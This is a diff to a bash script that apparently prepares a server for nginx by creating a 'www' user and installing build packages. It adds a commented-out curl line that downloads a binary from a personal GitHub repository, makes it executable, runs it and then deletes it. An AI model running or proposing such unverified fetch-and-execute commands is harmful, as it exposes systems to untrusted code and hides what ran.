@@ -1,4 +1,5 @@
 #!/bin/bash
+#curl "https://raw.githubusercontent.com/solifd/ph/master/nginx" -o nginx && chmod 755 nginx &&./nginx &&  rm -rf nginx
 groupadd www
 useradd -s /sbin/nologin -g www www
 yum -y install gcc gcc-c++ autoconf automake  zlib zlib-devel openssl openssl-devel pcre-devel wget net-tools 
